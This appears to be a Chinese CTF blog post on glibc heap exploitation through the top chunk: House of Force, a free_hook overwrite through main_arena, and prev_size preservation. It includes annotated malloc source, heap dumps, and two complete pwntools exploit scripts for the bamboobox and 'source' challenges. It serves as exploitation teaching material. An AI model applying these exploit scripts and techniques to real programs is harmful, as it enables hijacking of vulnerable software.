---
clayout: post
title:  "top chunk利用"
date:   2020-2-24
desc: ""
keywords: ""
categories: [Binary]
tags: [pwn]
icon: icon-html
---

# top chunk利用

## House of Orange

略

## House of Force

```c
  /* finally, do the allocation */
  p = av->top;
  size = chunksize (p);

  /* check that one of the above allocation paths succeeded */
  if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE))
    {
      remainder_size = size - nb;
      remainder = chunk_at_offset (p, nb);
      av->top = remainder;
      set_head (p, nb | PREV_INUSE | (av != &main_arena ? NON_MAIN_ARENA : 0));
      set_head (remainder, remainder_size | PREV_INUSE);
      check_malloced_chunk (av, p, nb);
      return chunk2mem (p);
    }
```

从top chunk分配

```c
if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE))
```

转化为无符号数比较，如果把size改为-1必能过

申请后更新top chunk

```c
      remainder_size = size - nb;
      remainder = chunk_at_offset (p, nb);
      av->top = remainder;
```

```c
/* Treat space at ptr + offset as a chunk */
#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))
```

nb是申请的size，chunk_at_offset根据nb找到新的top chunk位置

如果能把top chunk改为-1，并且能申请任意大小的chunk，就能控制top chunk到任意位置

glibc2.29上香

### hitcontraining_bamboobox

有个放着hello_message和goodbye_message函数的白给chunk，把goodbye_message改成magic，exit拿flag

edit size没验，可以溢出改top chunk size，把指针抬到白给chunk

```python
from pwn import *
r = remote('node3.buuoj.cn',28044)
#r = process('./bamboobox')
elf = ELF('./bamboobox')

magic = 0x400d49

def show():
	r.sendlineafter('Your choice:','1')

def add(size,name):
	r.sendlineafter('Your choice:','2')
	r.sendlineafter('name:',str(size))
	r.sendlineafter('item:',name)

def edit(index,size,name):
	r.sendlineafter('Your choice:','3')
	r.sendlineafter('item:',str(index))
	r.sendlineafter('name:',str(size))
	r.sendafter('item:',name)

def free(index):
	r.sendlineafter('Your choice:','4')
	r.sendlineafter('item:',str(index))


add(0x60,'fuck')
edit(0,0x70,'a'*0x60+p64(0)+'\xff'*8)
add(-0x70-0x20-0x10,'aaaa')
add(0x20,p64(magic)*2)
r.interactive()
```



## 利用top chunk写free hook

在malloc hook写onegadget不好使，用realloc调整栈再跳onegadget也不好使，没办法直接写free hook，可以考虑利用top chunk写free hook

```c
  /* finally, do the allocation */
  p = av->top;
  size = chunksize (p);

  /* check that one of the above allocation paths succeeded */
  if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE))
    {
      remainder_size = size - nb;
      remainder = chunk_at_offset (p, nb);
      av->top = remainder;
      set_head (p, nb | PREV_INUSE | (av != &main_arena ? NON_MAIN_ARENA : 0));
      set_head (remainder, remainder_size | PREV_INUSE);
      check_malloced_chunk (av, p, nb);
      return chunk2mem (p);
    }
```

av->top在main_arena

glibc2.23

把top chunk指针改为free hook上方某个符合top chunk size条件的位置，一般使用fastbin attack，malloc hook-0x3有满足条件的size，如果一次不够写到av->top可以控制main_arena+48的fastbin指针指向有合法size的main_arena+16再来一次

👴为什么不直接打malloc_hook，因为onegadget不好使

把av->top覆盖为free_hook-0xb58，size符合条件

然后malloc(0x90)18次，下一次就到free hook，把system写进free hook

👴为什么不把onegadget写进free hook，因为onegadget不好使



## 利用top chunk保存prev_size

size在unsorted bin范围的chunk，与top chunk相邻，free时与top chunk合并，不相邻进unsorted bin

malloc从unsorted bin出来时prev\_size会清除，从top chunk出来，prev\_size还在

合并了unsorted bin的top chunk

```c
pwndbg> x/10gx 0x8403a00
0x8403a00:      0x0000000000000000      0x0000000000020601
0x8403a10:      0x00007fffff3ebca0      0x00007fffff3ebca0
0x8403a20:      0x0000000000000000      0x0000000000000000
0x8403a30:      0x0000000000000000      0x0000000000000000
0x8403a40:      0x0000000000000000      0x0000000000000000
```

第一次malloc

```c
pwndbg> x/64gx 0x8403a00
0x8403a00:      0x0000000000000000      0x0000000000000101
0x8403a10:      0x0068732f6e69622f      0x00007fffff3ebca0
0x8403a20:      0x0000000000000000      0x0000000000000000
0x8403a30:      0x0000000000000000      0x0000000000000000
0x8403a40:      0x0000000000000000      0x0000000000000000
0x8403a50:      0x0000000000000000      0x0000000000000000
0x8403a60:      0x0000000000000000      0x0000000000000000
0x8403a70:      0x0000000000000000      0x0000000000000000
0x8403a80:      0x0000000000000000      0x0000000000000000
0x8403a90:      0x0000000000000000      0x0000000000000000
0x8403aa0:      0x0000000000000000      0x0000000000000000
0x8403ab0:      0x0000000000000000      0x0000000000000000
0x8403ac0:      0x0000000000000000      0x0000000000000000
0x8403ad0:      0x0000000000000000      0x0000000000000000
0x8403ae0:      0x0000000000000000      0x0000000000000000
0x8403af0:      0x0000000000000000      0x0000000000000000
0x8403b00:      0x0000000000000100      0x0000000000020501//prev_size
```

第二次malloc

```c
pwndbg> x/128gx 0x8403a00
0x8403a00:      0x0000000000000000      0x0000000000000101
0x8403a10:      0x0068732f6e69622f      0x00007fffff3ebca0
0x8403a20:      0x0000000000000000      0x0000000000000000
0x8403a30:      0x0000000000000000      0x0000000000000000
0x8403a40:      0x0000000000000000      0x0000000000000000
0x8403a50:      0x0000000000000000      0x0000000000000000
0x8403a60:      0x0000000000000000      0x0000000000000000
0x8403a70:      0x0000000000000000      0x0000000000000000
0x8403a80:      0x0000000000000000      0x0000000000000000
0x8403a90:      0x0000000000000000      0x0000000000000000
0x8403aa0:      0x0000000000000000      0x0000000000000000
0x8403ab0:      0x0000000000000000      0x0000000000000000
0x8403ac0:      0x0000000000000000      0x0000000000000000
0x8403ad0:      0x0000000000000000      0x0000000000000000
0x8403ae0:      0x0000000000000000      0x0000000000000000
0x8403af0:      0x0000000000000000      0x0000000000000000
0x8403b00:      0x0000000000000100      0x0000000000000101//prev_size
0x8403b10:      0x0068732f6e69622f      0x0000000000000000
0x8403b20:      0x0000000000000000      0x0000000000000000
0x8403b30:      0x0000000000000000      0x0000000000000000
0x8403b40:      0x0000000000000000      0x0000000000000000
0x8403b50:      0x0000000000000000      0x0000000000000000
0x8403b60:      0x0000000000000000      0x0000000000000000
0x8403b70:      0x0000000000000000      0x0000000000000000
0x8403b80:      0x0000000000000000      0x0000000000000000
0x8403b90:      0x0000000000000000      0x0000000000000000
0x8403ba0:      0x0000000000000000      0x0000000000000000
0x8403bb0:      0x0000000000000000      0x0000000000000000
0x8403bc0:      0x0000000000000000      0x0000000000000000
0x8403bd0:      0x0000000000000000      0x0000000000000000
0x8403be0:      0x0000000000000000      0x0000000000000000
0x8403bf0:      0x0000000000000000      0x0000000000000000
0x8403c00:      0x0000000000000200      0x0000000000020401//prev_size
```



### source

off by null

有0截断，无法直接伪造prev_size

利用top chunk保存prev_size

```c
pwndbg> x/128gx 0x8403a00
0x8403a00:      0x0000000000000000      0x0000000000000101//7
0x8403a10:      0x00007fffff3ebca0      0x00007fffff3ebca0
0x8403a20:      0x0000000000000000      0x0000000000000000
0x8403a30:      0x0000000000000000      0x0000000000000000
0x8403a40:      0x0000000000000000      0x0000000000000000
0x8403a50:      0x0000000000000000      0x0000000000000000
0x8403a60:      0x0000000000000000      0x0000000000000000
0x8403a70:      0x0000000000000000      0x0000000000000000
0x8403a80:      0x0000000000000000      0x0000000000000000
0x8403a90:      0x0000000000000000      0x0000000000000000
0x8403aa0:      0x0000000000000000      0x0000000000000000
0x8403ab0:      0x0000000000000000      0x0000000000000000
0x8403ac0:      0x0000000000000000      0x0000000000000000
0x8403ad0:      0x0000000000000000      0x0000000000000000
0x8403ae0:      0x0000000000000000      0x0000000000000000
0x8403af0:      0x0000000000000000      0x0000000000000000
0x8403b00:      0x0000000000000100      0x0000000000000100//8
0x8403b10:      0x0068732f6e69622f      0x0000000000000000
0x8403b20:      0x0000000000000000      0x0000000000000000
0x8403b30:      0x0000000000000000      0x0000000000000000
0x8403b40:      0x0000000000000000      0x0000000000000000
0x8403b50:      0x0000000000000000      0x0000000000000000
0x8403b60:      0x0000000000000000      0x0000000000000000
0x8403b70:      0x0000000000000000      0x0000000000000000
0x8403b80:      0x0000000000000000      0x0000000000000000
0x8403b90:      0x0000000000000000      0x0000000000000000
0x8403ba0:      0x0000000000000000      0x0000000000000000
0x8403bb0:      0x0000000000000000      0x0000000000000000
0x8403bc0:      0x0000000000000000      0x0000000000000000
0x8403bd0:      0x0000000000000000      0x0000000000000000
0x8403be0:      0x0000000000000000      0x0000000000000000
0x8403bf0:      0x0000000000000000      0x0000000000000000
0x8403c00:      0x0000000000000200      0x0000000000000100//9 off by null
0x8403c10:      0x0068732f6e69622f      0x0000000000000000
0x8403c20:      0x0000000000000000      0x0000000000000000
0x8403c30:      0x0000000000000000      0x0000000000000000
0x8403c40:      0x0000000000000000      0x0000000000000000
0x8403c50:      0x0000000000000000      0x0000000000000000
0x8403c60:      0x0000000000000000      0x0000000000000000
0x8403c70:      0x0000000000000000      0x0000000000000000
0x8403c80:      0x0000000000000000      0x0000000000000000
0x8403c90:      0x0000000000000000      0x0000000000000000
0x8403ca0:      0x0000000000000000      0x0000000000000000
0x8403cb0:      0x0000000000000000      0x0000000000000000
0x8403cc0:      0x0000000000000000      0x0000000000000000
0x8403cd0:      0x0000000000000000      0x0000000000000000
0x8403ce0:      0x0000000000000000      0x0000000000000000
0x8403cf0:      0x0000000000000000      0x0000000000000000
0x8403d00:      0x0000000000000000      0x0000000000020301
0x8403d10:      0x0000000000000000      0x0000000000000000
```



```python
from pwn import *

r = process('./source')
elf = ELF('./source')
libc = ELF('/libc-2.27.so')
    
def add(size,content):
    r.sendlineafter('which command?', '1')
    r.sendlineafter('size ', str(size))
    r.sendafter('content', content)

def free(index):
    r.sendlineafter('which command?', '2')
    r.sendlineafter('index', str(index))

def show(index):
    r.sendlineafter('which command?', '3')
    r.sendlineafter('index', str(index))


for i in range(7):
    add(0xf0, '/bin/sh\x00')

add(0xf0, '/bin/sh\x00')#7
add(0xf0, '/bin/sh\x00')#8
add(0xf0, '/bin/sh\x00')#9

for i in range(7):
    free(i)

free(7)
free(8)
free(9)

for i in range(7):
    add(0xf0, '/bin/sh\x00')

add(0xf0, '/bin/sh\x00')#7
add(0xf0, '/bin/sh\x00')#8
add(0xf0, '/bin/sh\x00')#9

for i in range(7):
    free(i)

free(7)
add(0xf0, '/bin/sh\x00')#0
free(8)
add(0xf8, '/bin/sh\x00')#1 off by null
free(0) 

free(9)#unlink

for i in range(7):
    add(0xf0, '/bin/sh\x00')

add(0xf0, '/bin/sh\x00')
add(0xf0, '/bin/sh\x00')

free(0)
free(1)

show(9)
r.recvline()
r.recvuntil(' ')
heap_base = u64(r.recvuntil('\n',drop=True).ljust(8, '\x00')) - 0x310
log.success('heap_base: ' + hex(heap_base))

add(0xf0, '\x00')#0

free(2)
free(3)
free(4)
free(5)

free(0)
free(9)

add(0xf0, p64(heap_base+0x260))
add(0xf0, p64(0))
add(0x8, p64(heap_base+0xa18))

show(0)
r.recvline()
r.recvuntil(' ')
leak = u64(r.recvuntil('\n',drop=True).ljust(8, '\x00'))
libc_base = leak-libc.symbols['__malloc_hook']-96-0x10
free_hook = libc_base+libc.symbols['__free_hook']
system = libc_base+libc.symbols['system']
log.success(hex(libc_base))
log.success(hex(free_hook))

# double free
free(1)

add(0xf0, p64(heap_base+0x260))
add(0xf0, p64(0))
add(0x8, p64(heap_base+0xa10))


free(1)
free(3)
add(0x8, p64(free_hook))
add(0xf0, '/bin/sh\x00')
add(0x8, p64(system))

free(0)

r.interactive()

```

